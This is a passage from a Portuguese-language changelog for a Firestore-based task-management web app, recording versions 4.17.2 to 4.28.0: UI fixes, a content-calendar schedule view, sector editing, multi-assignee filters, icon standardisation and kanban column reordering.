### 2) Modal de tarefa — botão de meta renomeado e simplificado
**Antes**: `🎯 Vincular meta…` + chip "ESCOLHER" no canto direito
**Agora**: `🎯 SELECIONAR METAS` (caixa-alta, sem chip extra)

Quando há metas vinculadas, mostra contagem (`2 metas vinculadas · 3 vínculos`).
Removido o "ESCOLHER / Editar" que duplicava o feedback visual.

### 3) Popup "Tarefa concluída" — visual unificado com modal de criação
**Bug**: a seção de seleção de meta no overlay de conclusão usava um
`<select>` flat com todas metas listadas linearmente — destoava da
visual hierárquica do modal de criação.

**Fix**: substituído por uma árvore hierárquica idêntica ao picker do
modal de criação:
- **Plano (goalName)** como header em caixa-alta + linha divisória
- **◆ Pilar** indentado, em negrito, cinza médio
- **Metas** em sub-itens com checkbox individual
- Campo de busca client-side (filtra por meta, pilar e plano)
- Multi-select (várias metas evidenciadas pela mesma tarefa)
- Contador visual de selecionadas no rodapé da árvore
- Períodos atualizam com base na PRIMEIRA meta selecionada

Confirm: gera N `metaLinks` (um por combinação assignee × meta selecionada).

### Files
- `js/pages/dashboard.js` (filtro myGoals via getResponsavelIds)
- `js/components/taskModal.js` (label SELECIONAR METAS + árvore na overlay
  de conclusão + multi-select com busca + handler atualizado)
- `js/version.js`, `index.html`, `CHANGELOG.md`

---

## [4.28.0+20260508-cc-virtual-slots-agenda-previa] — 2026-05-08

Release **MINOR** — Calendário de Conteúdo passa a exibir a "agenda prévia"
dos tipos de tarefa (slots virtuais).

### Pedido do user
> "verifique o módulo tipo de tarefa. quando se cria um tipo de tarefa,
> existe a possibilidade de criar uma agenda prévia. Newsletters é um caso
> com isso. lá tem os slots que se criam para agenda previa, que deve
> espelhar em calendário, portal de solicitações e, agora, em calendário
> de conteúdo. A proposta é o usuario ver o que já existe previsto por
> tipo de tarefa."

### Schema descoberto
Tipos de tarefa têm `scheduleSlots[]`, cada um com:
- `id`, `title`, `active`
- `recurrence`: `'weekly'` | `'monthly_days'` | `'custom'`
- `weekDay` (0-6) para semanal
- `monthDays` [1..31] para dias-do-mês
- `customDates` [yyyy-mm-dd] para datas avulsas
- `requestingArea`, `color`

Antes da v4.28 esses slots eram usados em outros lugares (calendário
geral, portal de solicitações, validação de "fora do calendário"),
mas o **Calendário de Conteúdo não exibia**.

### Implementação
1. **`generateVirtualSlots(date)`** — para cada tipo de tarefa em uso pelos
   projetos ativos (e respeitando o filtro `visibleTaskTypes`), itera
   `scheduleSlots[]` e checa qual recorrência casa com a data:
   - weekly: `s.weekDay === date.getDay()`
   - monthly_days: `s.monthDays.includes(dayOfMonth)`
   - custom: `s.customDates.includes(iso)`
   Retorna array de objetos `{ virtual:true, date, title, color, typeId,
   typeName, slotId, area }`.
2. **`renderVirtualSlotCard(vslot, mode)`** — visual distinto:
   - Borda **tracejada** (`1px dashed`) — diferencia de tarefa real
   - Ícone `◌` (slot vazio aguardando)
   - Texto em **itálico** + opacity reduzida
   - Modos `compact` (mês) e `detailed` (semana)
3. **De-duplicação**: se já existe tarefa real do mesmo `typeId` no dia,
   o slot virtual é OCULTADO (a previsão já foi materializada).
4. **Click em virtual slot**: abre `taskModal` em modo CRIAÇÃO pré-preenchido
   com título do slot, typeId, projectId (primeiro ativo), dueDate da célula,
   `requestingArea` herdada do slot, tag `agenda-previa`.

### Fluxo do usuário
1. User entra no Cal de Conteúdo com projeto Newsletters
2. Ativa "Tarefas dos projetos" + "Newsletter" no filtro de tipos
3. Vê:
   - **Tasks reais** (já criadas): borda azul sólida
   - **Slots virtuais** (agenda prévia): borda azul tracejada com ◌ e itálico
4. Click num slot virtual = cria a tarefa pré-preenchida pra aquela data

### Files
- `js/pages/contentCalendar.js` (generateVirtualSlots + renderVirtualSlotCard
  + integrações em renderMonthView/renderWeekView + click handler)
- `js/version.js`, `index.html`, `CHANGELOG.md`

---

## [4.27.0+20260508-cc-task-types-resolve] — 2026-05-08

PATCH/MINOR — fix dos nomes de tipos de tarefa cifrados no Calendário de Conteúdo.

### Bug
Após v4.26 o popover "Tipos visíveis" mostrava itens como
**"Tipo AOo69u…"**, **"Tipo gcwpSi…"**, **"Tipo XVEgOw…"** em vez dos nomes
amigáveis. Causa: `store.get('taskTypes')` retornava `[]` na página de
Calendário de Conteúdo — o `loadTaskTypes()` é lazy (não roda no boot
desde v3.x para economizar reads) e a página de calendário nunca
disparava o load. Sem dados no store, o fallback caía em
`Tipo ${id.slice(0,6)}…`.

Adicionalmente, alguns tasks usam typeId estático legacy `'newsletter'`
(da constante `TASK_TYPES` em services/tasks.js) que NUNCA foi migrado pra
collection — esse caso aparecia como `(NÃO ENCONTRADO)`.

### Fix
1. **renderContentCalendar()**: agora chama `loadTaskTypes()` no boot da
   página (lazy, 1× por sessão).
2. **Nova função `resolveTaskType(typeId)`** com 3 níveis de fallback:
   - Doc Firestore por id (caso comum)
   - Map estático para legacy (`'newsletter'` → `'📧 Newsletter'`)
   - Genérico `Tipo (XXXXXX…)` como último recurso
3. **`renderTaskSlot` e `_openTaskTypePopover`** usam `resolveTaskType()`
   centralizado — antes faziam lookup independente direto no store.

### Impacto
Popover passa a exibir nomes legíveis: "Newsletter", "Comunicado",
"Post/story", "Roteiro" — em vez de IDs cifrados.

### Files
- `js/pages/contentCalendar.js` (loadTaskTypes + resolveTaskType + render usage)
- `js/version.js`, `index.html`, `CHANGELOG.md`

---

## [4.26.0+20260507-bugs-fix-rename-filter] — 2026-05-07

Release **MINOR** — 4 melhorias do user (3 bug fixes + 1 feature nova).

### 1) Lembretes / Anotações
**Bug**: Modal "Novo lembrete" às vezes recusava o título mesmo quando estava
preenchido.
**Causa**: `document.getElementById('rem-title')` podia retornar input de
um modal residual no DOM (race com double-click ou modal anterior não-fechado),
retornando valor vazio.
**Fix**: capturar refs no escopo do MODAL atual via `modalHandle.getElement()`
+ `querySelector`. Não depende mais de IDs globais. Mesmo tratamento em
`openNoteModal` (texto + cor).

**UX**: cards Lembretes & Anotações migrados pro **TOPO do Meu Painel**
(grid 2-col acima de "Meu Desempenho") — antes ficavam no rodapé direito.
User pediu mais visibilidade.

### 2) Setores legados — permitir renomear
**Pedido**: trocar "Concierge Bradesco" por "Concierge".

**Solução**: cards de setores legados agora têm botão ✎ Renomear que abre
modal com aviso. A função `renameLegacySector(legacy, {newName, color})`:
- Cria doc Firestore com `replacesLegacyName: legacyName` setado
- `getActiveSectors()` agora reconhece esse campo e oculta o nome legado
  da lista (sem deletar — preserva histórico)
- Novo nome aparece em filtros, pickers e na própria página

Tarefas existentes vinculadas ao nome antigo seguem intactas (preservação
de histórico) — UI passa a mostrar o novo nome onde renderiza por nome.

### 3) Tarefas — groupBy + filtro multi-assignee
**Bug**: ao agrupar por responsável e filtrar 2 users no filtro multi,
apareciam grupos extras (de co-responsáveis das mesmas tasks).
**Causa**: `computeGroups('assignee')` iterava por TODOS os assignees
das tasks que passaram pelo filtro, sem checar se cada uid estava no
filtro selecionado. Tasks com 3+ responsáveis criavam grupo pra cada um.
**Fix**: quando `filterAssignee` está setado, restringe os grupos APENAS
aos uids selecionados. Tasks aparecem só nos grupos relevantes.

### 4) Calendário de Conteúdo — filtro fino por tipo de tarefa (NOVO)
**Pedido**: "+ Adicionar tipo de tarefa com exibição opcional".

**Implementação**:
- Novo botão `+ Tipos: todos` ao lado do toggle "Tarefas dos projetos"
  (visível só quando o toggle global está ON)
- Click abre popover com checkboxes dos typeIds usados pelas tasks dos
  projetos ativos (extraídos automaticamente do dataset)
- "Selecionar todos" / "Limpar" / "Aplicar"
- Estado persistido em localStorage `cc-visible-task-types`
  (null = todos visíveis; array = só os listados)
- Aplicado ao filtro: `projectTasksForDate` checa `t.typeId` contra a lista
- Label do botão atualiza dinamicamente: "Tipos: todos" ou "Tipos: N"

### Files
- `js/pages/dashboard.js` (Lembretes/Anotações: refs scoped + reposicionados)
- `js/services/sectors.js` (renameLegacySector + getActiveSectors com replaces)
- `js/pages/sectors.js` (botão renomear + openRenameLegacyModal)
- `js/pages/tasks.js` (computeGroups respeita filterUids em assignee)
- `js/pages/contentCalendar.js` (visibleTaskTypes + popover + filtro)
- `js/version.js`, `index.html`, `CHANGELOG.md`

---

## [4.25.0+20260507-cc-project-task-slots] — 2026-05-07

Release **MINOR** — completa o pacote da v4.24 com a feature deferida.

### Calendário de Conteúdo: slots de tarefa por projeto + flag ocultar
**Pedido**: "Calendário de Conteúdo - incluir os slots de tipo de tarefa
vinculadas aos projetos, com visualização default e ocultar opcional, via flag."

**Implementação**:
- Nova state global `showProjectTasks` persistida em localStorage
  (`cc-show-project-tasks`, default: true)
- `loadProjectTasks()` puxa todas as tasks dos projetos ativos com `dueDate`
  preenchido (executado no boot e ao adicionar/remover projeto)
- `projectTasksForDate(date)` retorna as tasks daquele dia
- `renderTaskSlot(task, mode)` renderiza com estilo distinto:
  - Borda esquerda azul (#0EA5E9) — diferencia de slots de conteúdo dourados
  - Ícone do tipo de tarefa (do task type cadastrado) ou 📋 default
  - Tasks done: opacity 0.55 + line-through
  - Modo `compact` (mês) e `detailed` (semana)
- Toggle button no header — 👁 quando ON, 🚫 quando OFF
- Click em task slot → abre `taskModal` em modo edit
- Após save: recarrega tasks e re-renderiza
- View mês: limita a 3 entries no total (slots + tasks); excedente vira
  "+N tarefa(s)" em itálico azul

### Files
- `js/pages/contentCalendar.js` (state + 3 funções novas + render + handlers)
- `js/version.js`, `index.html`, `CHANGELOG.md`

---

## [4.24.0+20260507-reminders-notes-groupby-fixes] — 2026-05-07

Release **MINOR** — 4 melhorias do user (1 deferido p/ próxima).

### 1) Tarefas: agrupar por responsável
Novo `groupBy === 'assignee'` em tasks.js. Tarefas com múltiplos
responsáveis aparecem em CADA grupo (semântica OR). "Sem responsável"
fica no fim. Label do grupo: iniciais + nome completo + cor avatar.

### 2) Bug do tour: skip exigia 3 cliques
**Causa**: `triggerTourFor` disparava várias vezes (re-render da página)
e welcome modals empilhavam — cada click fechava só 1 backdrop.
**Fix em `tour.js showWelcomeModal`**:
- Idempotente: remove TODOS `.tour-welcome-backdrop` no início
- Cleanup global ao fechar (todos backdrops + ESC handler)
- Click no backdrop (fora do modal) também conta como skip (UX padrão)

### 3) Presence trava no hover
**Causa**: `let tip = null` era closure-scoped dentro de `renderOnlineUsers`.
A cada update de presença (~1/min), novo closure rodava sem referência ao tip
antigo, que ficava órfão no DOM.
**Fix em `header.js`**: limpa qualquer `.online-user-tip` órfão no início de
cada render (defesa em profundidade — mouseleave continua funcionando como antes).

### 4) Lembretes & Anotações no Meu Painel (NOVO)
- Novo serviço `services/userNotes.js` (CRUD + checkDueReminders)
- 2 collections privativas Firestore: `user_notes`, `user_reminders`
  (rules: read/write apenas pelo dono via `userId == request.auth.uid`)
- 2 cards no dashboard direito:
  - **Lembretes**: lista com checkbox concluído, badge de prazo (vencido/hoje/amanhã/em N dias),
    botão "→ tarefa" (converte em task pré-preenchida via taskModal),
    botão excluir. Modal de criar com título + data + checkbox notify
  - **Anotações**: post-its 2-col, 6 cores, click pra editar, ✕ pra excluir
- Toast `warning` on-load se houver lembretes vencidos não notificados
  (uma vez por sessão, marca `notified:true` pra não repetir)

### Deferido p/ 4.25
- Calendário de Conteúdo: slots de tipo de tarefa por projeto + flag de ocultar.
  Escopo grande (mexe em service de slots + render de tipo de tarefa) — tratado
  em release dedicada.

### Files
- `js/services/userNotes.js` (novo)
- `js/components/tour.js` (showWelcomeModal idempotente)
- `js/components/header.js` (cleanup `.online-user-tip` órfão)
- `js/pages/tasks.js` (groupBy assignee + option no select)
- `js/pages/dashboard.js` (mountUserPanels + 2 cards + 2 modais auxiliares)
- `firestore.rules` (`user_notes`, `user_reminders`) — deployed
- `js/version.js`, `index.html`

---

## [4.23.2+20260507-sectors-union-rules] — 2026-05-07

PATCH — fix dois bugs descobertos no E2E da v4.23.0/4.23.1.

### #1 Setores: criação ocultava os 19 legados
**Bug**: ao criar 1 setor novo via UI, os 19 hardcoded (BTG, Marketing, etc.)
sumiam dos filtros e da página de Setores. Causa: `getActiveSectors()` retornava
DEFAULT_SECTORS APENAS quando a collection estava vazia — qualquer doc fazia
substituir, não unir.

**Fix**: nova lógica de UNIÃO em `getActiveSectors()` (services/sectors.js)
e nos consumers (filterBar `getUserSectorOptions`/`areaOpts`):
- Dinâmicos ATIVOS entram primeiro (ordem por `order`)
- Legados SEM doc com mesmo nome entram depois (back-compat)
- Doc com `active:false` REMOVE setor da lista (mecanismo pra "ocultar"
  legados criando um doc com mesmo nome desativado)

### #2 Firestore rules sem regra para `sectors`
**Bug**: createSector falhava com `permission-denied`. Causa: collection
`sectors` (nova em v4.23.0) sem regras → bloqueio default.

**Fix**: adicionada regra em `firestore.rules` (mesmo padrão de `nucleos`):
- read público (portal de solicitações usa)
- create/update/delete: `isAdmin()`
- Deployed via `firebase deploy --only firestore:rules`

### Files
- `js/services/sectors.js` (getActiveSectors com união)
- `js/components/filterBar.js` (getUserSectorOptions + areaOpts com união)
- `firestore.rules` (regra `match /sectors/{sectorId}`)

---

## [4.23.1+20260507-fix-audit-fallback] — 2026-05-07

PATCH — fix bug do histórico no card descoberto no E2E.

### Problema
v4.23.0 trouxe a seção "Histórico de alterações" no taskModal, mas todas as
tarefas mostravam "Sem registros". Causa: o fallback do `fetchEntityHistory`
(quando o composite index `(entity, entityId, timestamp DESC)` não existe)
ainda usava `where('entityId', '==', X) + orderBy('timestamp', 'desc')`, que
TAMBÉM exige composite index — ele só pulava o `where('entity')` mas mantinha
um where + orderBy → mesma falha.

### Fix
Fallback agora é REALMENTE index-free: só `orderBy('timestamp', 'desc')` (single
field, sempre indexado pelo Firestore) com filtro client-side por `entity` E
`entityId`. fallbackLimit subiu de 500 → 1500 pra cobrir tarefas com mudanças
mais antigas (~30 dias de auditoria em uma instalação ativa).

### Files
- `js/auth/audit.js` (fallback corrigido)

---

## [4.23.0+20260507-sectors-history-drilldown-notif] — 2026-05-07

Release **MINOR** — quatro melhorias pedidas pelo user numa única release.

### 1) Setores: CRUD completo (criar, editar, excluir)
**Antes**: lista hardcoded em `services/tasks.js` (REQUESTING_AREAS),
sem como editar via UI. Página de Setores só permitia gerenciar núcleos.

**Agora**:
- Nova collection Firestore `sectors` com `{name, color, order, active, createdAt, createdBy}`
- API: `fetchSectors`, `createSector`, `updateSector`, `deleteSector` (soft delete)
- `loadSectors()` no boot (auth.js), popula `store.get('sectors')`
- `getActiveSectors()` helper — retorna lista dinâmica OU fallback p/ DEFAULT_SECTORS
- Sectors page (`pages/sectors.js`):
  - Botão "+ Novo Setor" no header
  - Botões ✎ editar e ✕ excluir em cada card de setor que tem doc Firestore
  - Modal com nome + cor (12 opções) + ordem de exibição
  - Setores legados (sem doc) aparecem com badge "padrão" — criar setor com mesmo nome para tornar editável
  - Confirmação de exclusão alerta núcleos/usuários afetados
- Consumers principais usam lista dinâmica:
  - `filterBar.js`: `getUserSectorOptions()` e `areaOpts()` — filtros refletem setores criados

### 2) Dashboard Produtividade: cards clicáveis (drill-down)
**Antes**: cards eram estáticos, sem navegação.

**Agora**:
- Cards "Total / Em Andamento / Concluídas / Em Atraso" → click abre lista de tarefas pré-filtrada
- Card "Pontualidade" tem 3 sublinks (no prazo · atrasadas · sem prazo) — cada um navega pra cenário exato descrito
- Novos query params em tasks.js: `?completedOnTime=1`, `?completedLate=1`, `?completedNoDueDate=1`
- Filter logic em `applyFilters()`: compara `completedAt` vs `dueDate` no client
- CSS: `.kpi-sublink` com underline pontilhado + hover dourado

### 3) Notificações: bug do nome (sempre Rafaela Gouvêa)
**Causa raiz identificada**: `notify()` lia `store.get('userProfile')?.name` no momento da
criação. Se `userProfile` ficasse desatualizado/cacheado de uma sessão anterior, o nome
gravado era do user errado. Notificações antigas mantinham o nome legado.

**Fix em duas camadas**:
1. **notify()**: agora resolve o nome do actor pelo `store.get('users')` (source of truth
   atualizado por subscriptions) usando o `currentUser.uid`. userProfile vira fallback.
2. **notificationPanel render**: ao exibir cada notificação, re-resolve o nome do actor pelo
   users store (via `actorId`). Notificações ANTIGAS com nome errado também são corrigidas
   no display, sem precisar reescrever os docs.

### 4) Histórico de alterações dentro do card da tarefa
**Antes**: histórico só visível na página global de Auditoria.

**Agora**:
- Nova função `fetchEntityHistory(entity, entityId, max)` em `auth/audit.js`
  - Query server-side por `(entity, entityId, timestamp DESC)`
  - Fallback client-side se composite index não existir
- Seção "Histórico de alterações" no taskModal (lazy-load on click)
- Timeline mostra: ação legível (ACTION_LABELS), campos alterados (`details.fields`
  → labels em português), transição de status (when applicable), quem e quando
- Resolve nome do autor pelo users store atual (mesma estratégia anti-bug do #3)
- `tasks.update` audit já gravava `details.fields` — só precisei consumir

### Files
- `js/services/sectors.js` (CRUD novo + getActiveSectors)
- `js/pages/sectors.js` (UI de setor + modal + delete)
- `js/auth/auth.js` (loadSectors no boot)
- `js/auth/audit.js` (fetchEntityHistory)
- `js/services/notifications.js` (fix actorName)
- `js/components/notificationPanel.js` (resolve actor no render)
- `js/components/filterBar.js` (consumes lista dinâmica)
- `js/components/taskModal.js` (seção histórico)
- `js/pages/dashboards.js` (kpiCard recebe link, sublinks Pontualidade)
- `js/pages/tasks.js` (3 novos url params + filtros)
- `css/dashboards.css` (.kpi-sublink)
- `js/version.js`, `index.html`, `CHANGELOG.md`

---

## [4.22.0+20260507-icons-phase-a-finalize] — 2026-05-07

Release **MINOR** — fechamento da Fase A de padronização de ícones.
Os 3 itens deixados pendentes em v4.20 (escopo deliberado) agora migrados.

### Pedido do user
> "opere o que restou:
> - Bulk action bar categórica (📅 Prazo, 🔥 Prioridade, 🚦 Status, 👤 Responsável, ▸ Área, ◈ Projeto, ◉ Núcleo)
> - H1 emojis hardcoded em pages individuais
> - Botões ✕ próprios de painéis (insightsPanel, notificationPanel, aiPanel, helpPanel)"

### 1) Bulk Action Bar — botões categóricos em SVG
`bulkActionBar.js`:
- 📅 Prazo → `renderIcon('calendar')`
- 🔥 Prioridade → `renderIcon('flame')`
- 🚦 Status → `renderIcon('flag')`
- 👤 Responsável → `renderIcon('user')`
- ▸ Área → `renderIcon('folder')`
- ◈ Projeto → `renderIcon('briefcase')`
- ◉ Núcleo → `renderIcon('target')`

### 2) Painéis ✕ migrados
- `notificationPanel.js`: close `✕` (header) + dismiss `✕` (cada item) → `renderIcon('x')`
- `aiPanel.js`: chat-close `✕` + attach-chip-remove `✕` → SVG
- `insightsPanel.js`: 4 ocorrências (popover-close, formulário-close, edit ✎ e del ✕ em 2 templates) → `edit-pencil` e `x` SVGs
- `filterBar.js`: botão "✕ Limpar filtros" → SVG x

### 3) H1 emojis removidos
Header global já renderiza ícone canônico via `header.js` + `icons.js`. Emojis
duplicados no `<h1 class="page-title">` viraram ruído visual:
- `help.js`: ❓ Ajuda → Ajuda
- `checkin.js`: ⏱ Check-in → Check-in
- `aiHub.js`: ◈ IA Hub → IA Hub
- `aiAutomations.js`: ⚡ Automações IA → Automações IA
- `aiSkills.js`: ◈ IA Skills → IA Skills
- `aiDashboard.js`: ◈ Dashboard IA → Dashboard IA
- `luxuryTravelAdmin.js`: ⚙ Administrar — … → Administrar — …

**Mantido**: `dashboard.js` "Olá, Nome! 👋" (saudação humana, não chrome).

### Novos ícones em `icons.js`
`flame`, `flag`, `user`, `folder`, `briefcase`, `target`, `minus` — outline
lucide-style, viewBox 24×24, currentColor.

### Files
- `js/components/icons.js`
- `js/components/bulkActionBar.js`
- `js/components/notificationPanel.js`
- `js/components/aiPanel.js`
- `js/components/insightsPanel.js`
- `js/components/filterBar.js`
- `js/pages/help.js`, `js/pages/checkin.js`, `js/pages/aiHub.js`,
  `js/pages/aiAutomations.js`, `js/pages/aiSkills.js`,
  `js/pages/aiDashboard.js`, `js/pages/luxuryTravelAdmin.js`
- `js/version.js`, `index.html`

### Status da Fase A
✅ Header (4.19/4.20) · ✅ Toast (4.20) · ✅ Action buttons taskModal (4.20)
✅ Bulk action bar categórica (4.22) · ✅ Painéis ✕ (4.22) · ✅ H1 emojis (4.22)

User content (B1) — emojis editáveis em projetos/squads/tipos/áreas — segue intacto.

---

## [4.21.0+20260507-multi-assignee-recurrence-cards] — 2026-05-07

Release **MINOR** — três pedidos do user num pacote: filtro multi-responsável,
recorrência editável após criação e fix visual no card kanban.

### Pedido do user
> 1. filtros "por responsável" - ter a possibilidade de selecionar mais de um responsável
> 2. em steps, o botão seletor que vai em cada card está sobreposto à informação de projeto, deixando o visual poluído
> 3. tarefa recorrente: as tarefas importadas do planner não trazem a opção de recorrência. Usuário quer ter o poder de decisão depois da criação.

### 1) Filtro multi-select de responsável
Adicionado `openMultiOptionPicker` / `bindMultiOptionPicker` / `renderMultiPickerButton` em
`optionPicker.js` — popover com checkbox, "Selecionar todos", "Limpar", busca e
contador. Não fecha ao clicar item; só ao clicar fora ou Esc.

`filterBar.js`: `assignee` agora é multi-select. State pode ser `null | string (legacy) | string[] (novo)`.
`buildFilterFn`: passa se a tarefa tem AO MENOS UM dos responsáveis selecionados (OR semantics).

`tasks.js`: filtro próprio também migrado pro multi-picker. Deep-link
`?assignee=uid` segue funcionando (single value vira `[uid]` internamente).

### 2) Card kanban — overlap do checkbox bulk
O `<input type=checkbox>` de seleção em massa (top:8 left:8, w:16 h:16) sobrepunha
o início do título e do nome do projeto do card. Fix em `tasks.css`:
- `.kanban-card-title` e `.kanban-card-project`: `padding-left` 6px → **24px**
- `.kanban-bulk-checkbox`: `opacity:0` por padrão; **aparece on hover** ou
  quando o card está `.bulk-selected` (Monday-style — chrome só quando útil)

Resultado: cards limpos no estado normal; checkbox sutil aparece quando o user
passa o mouse, sem nunca sobrepor texto.

### 3) Recorrência editável após criação
Antes: a seção de recorrência só era renderizada em `!isEdit` (criação). Tarefas
do Planner (importadas) ou criadas anteriormente nunca podiam virar recorrentes.

Agora em `taskModal.js`:
- Seção visível em **edição também** (label muda pra "Tornar tarefa recorrente")
- Tarefas vindas de uma série existente (`recurringFromTemplateId` setado) mostram
  só um aviso + link pra Configurações › Tarefas recorrentes
- Em edição: marcar o toggle + salvar = `updateTask` normal (com stale-check)
  + cria template em paralelo via `createTemplate`. Tarefa atual fica intocada;
  novas instâncias são geradas a partir da `startDate` configurada

### Files
- `js/components/optionPicker.js` (+ ~190 linhas: multi-picker)
- `js/components/filterBar.js`
- `js/pages/tasks.js`
- `js/components/taskModal.js`
- `css/tasks.css`
- `js/version.js`, `index.html`

---

## [4.20.0+20260507-ui-chrome-svg-icons] — 2026-05-07

Release **MINOR** — UI chrome universal: header secondary actions, toasts e botões de ação migram pra SVG.

### Pedido do user
> "pensando por esse mesmo raciocínio, o certo era ter a mesma biblioteca de ícones para tudo, não concorda? projetos, squads, tipo de tarefa, áreas… notificações, paleta de cores, ajuda, dashs, IA…"
>
> "fase a - ok, user content - B1"

### Decisão (escopo Fase A)
- **UI chrome (sistema)** → SVG via `icons.js` (single source of truth).
  Inclui: notificações (sino), busca, paleta, ajuda, toasts (success/error/warning/info + close) e botões universais de ação (✎ editar, ↺ desfazer, 🗑 excluir, + adicionar).
- **User content** → mantém **B1**: emojis seguem editáveis em projetos, squads, tipos de tarefa e áreas (campo aberto, customizável pelo user).

### Implementação
1. `js/components/icons.js` — +21 chaves novas (UI chrome):
   `bell`, `search`, `palette`, `plus`, `edit`, `edit-pencil`, `trash`,
   `rotate-ccw`, `check`, `x`, `check-circle`, `x-circle`,
   `alert-triangle`, `info-circle`, `chevron-down`, `chevron-right`,
   `more-vertical`, `external-link`, `download`, `upload`, `filter`.
2. `js/components/header.js` — botões 🔔/🔍/🎨/❓ → `renderIcon('bell'|'search'|'palette'|'help')`.
3. `js/components/toast.js` — glifos Unicode `✓ ✕ ⚠ ℹ` no ícone do toast → `check-circle / x-circle / alert-triangle / info-circle`. Botão de fechar `✕` → `renderIcon('x')`.
4. `js/components/taskModal.js` — footer: `🗑 Excluir` → `renderIcon('trash') + Excluir`; `✓ Concluir tarefa` → `renderIcon('check') + Concluir tarefa`.
5. `js/components/bulkActionBar.js` — botão `🗑 Excluir` e fechamento `✕` migrados pra SVG.

### Não-objetivos (deliberados nesta release)
- Botões categóricos da bulk action bar (📅 Prazo, 🔥 Prioridade, 🚦 Status, 👤 Responsável, ▸ Área, ◈ Projeto, ◉ Núcleo) — adiados.
- H1 emojis em pages individuais (header global já renderiza ícone canônico) — limpeza pendente.
- Painéis (insights, notification, ai, help) com `✕` próprio — pendente.

### Por que importa
Toast quebrava ao tentar usar variável `ICONS` removida (ReferenceError). Esta release fecha o gap entre a padronização v4.19 (sidebar/header) e o resto do chrome do sistema. User content continua livre — só o sistema ganha consistência visual.

### Files
- `js/components/icons.js`
- `js/components/header.js`
- `js/components/toast.js`
- `js/components/taskModal.js`
- `js/components/bulkActionBar.js`
- `js/version.js`, `index.html`

---

## [4.19.0+20260507-icons-single-source-of-truth] — 2026-05-07

Release **MINOR** — Padronização: ícone do header global = ícone do sidebar.

### Pedido do user
> "os ícones exibidos no sidebar devem ser os mesmos dos exibidos nas páginas"

### Diagnóstico (3 fontes inconsistentes)
| Local | Tipo | Cobertura |
|---|---|---|
| Sidebar | SVG (lucide-style) | 40+ rotas |
| Header global | Glifos Unicode (`⊞`, `✓`, `◈`...) | só 14 rotas |
| Page H1 | Emojis hardcoded em cada page | varia |

### Solução: single source of truth

**NOVO `js/components/icons.js`**: exporta `ICONS` map + `renderIcon(key, opts)`. 41 chaves cobrindo todas as rotas.

**Sidebar**: remove cópia local do ICONS (~75 linhas), importa do módulo. Comportamento idêntico ao anterior.

**Header**: remove glifos Unicode do `PAGE_TITLES`. Cobre 41 rotas (era 14). Renderiza SVG inline via `renderIcon(route, { size: 18 })`.

### Resultado
| Antes | Depois |
|---|---|
| Sidebar SVG `▤ kanban` ≠ Header Unicode `▤` | Sidebar SVG = Header SVG (idêntico) |
| Header só com ícone em 14 rotas | Header com ícone em 41 rotas |

### Próximo passo (não nesta versão)
Remover emojis hardcoded dos H1 das pages individuais (ex: "📱 Calendário de Conteúdo" → "Calendário de Conteúdo"). Polish caso a caso.

### Arquivos alterados
- `js/components/icons.js` — NOVO (~140 linhas)
- `js/components/sidebar.js` — remove ICONS local, importa do módulo
- `js/components/header.js` — PAGE_TITLES expandido + usa renderIcon
- `js/version.js` — bump 4.18.1 → 4.19.0
- `index.html`, `CHANGELOG.md`


## [4.18.1+20260507-kanban-col-reorder-rebuild] — 2026-05-07

Release **PATCH** — bugfix da v4.18.0: rebuild board quando ordem das colunas muda.

### Bug
Drag de coluna salvava ordem em localStorage mas DOM continuava igual. A otimização de `shouldRebuild` ignorava reorder em `groupBy='status'`.

### Fix
Condição agora é `renderedKeys !== expectedKeys` para qualquer groupBy. Reorder muda os values no array, expectedKeys muda, board rebuilda.

### Arquivos alterados
- `js/pages/kanban.js` — condicao do shouldRebuild
- `js/version.js`, `index.html`, `CHANGELOG.md`


## [4.18.0+20260507-kanban-col-reorder] — 2026-05-07

Release **MINOR** — Steps: drag-and-drop pra reordenar colunas (preferência do user).

### Pedido do user
> "usuário quer ter liberdade de mover colunas em steps, pra fazer a própria organização visual do kanban (e isso fica gravado nas preferências dele)"

### Implementação

#### Persistência
- Storage: `localStorage[primetour-kanban-col-order]` como JSON `{groupBy: ['col1','col2',...]}`
- Por groupBy: status, priority, area, sector, project, type, assignee — cada um tem sua ordem própria
- Per-browser (não sincroniza entre devices). Promover pra Firestore `users/{uid}/preferences` depois se houver demanda.

#### Helpers (kanban.js)
- `_loadColumnOrder(groupKey)` → `string[]`
- `_saveColumnOrder(groupKey, order)`
- `_applyColumnOrder(groupKey, cols)` → reordena array preservando colunas novas no fim e ignorando colunas que sumiram

#### `getKanbanGroups`
Aplica `_applyColumnOrder` antes de retornar (status + outros groupBy). Pipeline view (custom task type) **não usa** este sistema — pipeline tem ordem fixa pelos `steps[]` do task type.

#### Header como drop zone
```html
<div class="kanban-column-header" draggable="true" data-col-drag-key="...">
  <span class="kanban-col-drag-handle">⋮⋮</span>
  <div class="kanban-col-dot">...</div>
  ...
</div>
```

Handle `⋮⋮` aparece com opacity 0.4 e fica 1.0 no hover. `cursor: grab` no header inteiro pra UX óbvia.

#### `bindColumnReorder()`
Registra dragstart/dragover/dragleave/drop em cada header. Distingue de card-drag pelo prefixo `COL:` no `dataTransfer`.

#### Não-colisão com card-drag
- Card-drag usa apenas `taskId` no dataTransfer (sem prefixo)
- Column-drag usa `COL:<colKey>`
- `bindColumnDrop` (no col-body) ignora drops com prefixo `COL:` pra não tentar mover task fantasma

### CSS
- `.kanban-column-header:hover` — bg sutil + drag handle aparece
- `.col-dragging` — opacity 0.5 + scale 0.99
- `.col-drag-target` — bg dourado claro + box-shadow inset gold

### Lógica de reorder
1. Pega ordem atual do DOM (data-col-status)
2. Splice fromKey, insert na posição de toKey
3. Salva via `_saveColumnOrder(groupBy, novaOrdem)`
4. `renderCards(allTasks)` re-renderiza com nova ordem aplicada via `_applyColumnOrder`

### Edge cases tratados
- ✅ Coluna nova (não na ordem salva) → vai pro fim
- ✅ Coluna que sumiu (sector desativado) → ignorada na ordem salva
- ✅ Trocar groupBy → ordem específica do novo groupBy é aplicada
- ✅ User sem ordem salva → comportamento padrão (igual antes)

### Arquivos alterados
- `js/pages/kanban.js` — helpers + bindColumnReorder + apply em getKanbanGroups (~+90 linhas)
- `css/tasks.css` — drag handle + estados visuais (~+30 linhas)
- `js/version.js` — bump 4.17.2 → 4.18.0
- `index.html`, `CHANGELOG.md`


## [4.17.2+20260507-doc-staging-lab] — 2026-05-07

Release **PATCH** — Documentação técnica do novo ambiente de staging.

### Pedido do user
> "coloquei uma nova pessoa para trabalhar neste projeto e ele fez a versão staging do sistema. identifique isso no github, analise e adicione à documentação técnica."

### Identificação

Investigação revelou repo `primetour/gestor-btg-lp-builder-lab`:
- Privado, criado 2026-05-06 20:25 UTC
